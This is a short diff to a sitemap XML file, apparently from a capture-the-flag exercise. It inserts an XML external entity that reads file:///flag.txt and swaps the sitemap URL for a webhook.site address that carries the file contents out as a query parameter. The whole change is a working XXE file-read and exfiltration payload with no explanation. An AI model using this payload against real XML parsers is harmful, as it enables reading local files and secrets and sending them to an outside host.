@@ -1,7 +1,10 @@
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///flag.txt">
+]>
 <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
   <url>
-    <loc>https://google.com</loc>
+    <loc>https://webhook.site/b178d2a0-2de0-4ea2-afc7-dde25e5ae0aa?a=&xxe;</loc>
   </url>
 </urlset>
 
